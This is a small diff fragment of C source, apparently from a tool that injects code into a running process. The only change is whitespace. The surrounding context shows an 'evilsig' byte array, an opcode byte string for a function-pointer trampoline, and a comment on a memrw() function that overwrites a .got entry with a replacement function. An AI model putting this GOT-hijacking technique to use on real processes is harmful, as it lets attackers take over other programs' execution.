@@ -182,7 +182,7 @@ unsigned char evilsig[] = "'''
 /* depending on whether or not you use a function pointer or a */
 /* movl/jmp sequence. The one below is for a function pointer */
 unsigned char tc[] = "\\xc7\\x45\\xf0\\x00"; 
- 
+
  
 /*  Our memrw() function serves three purposes
  1. modify .got entry with replacement function
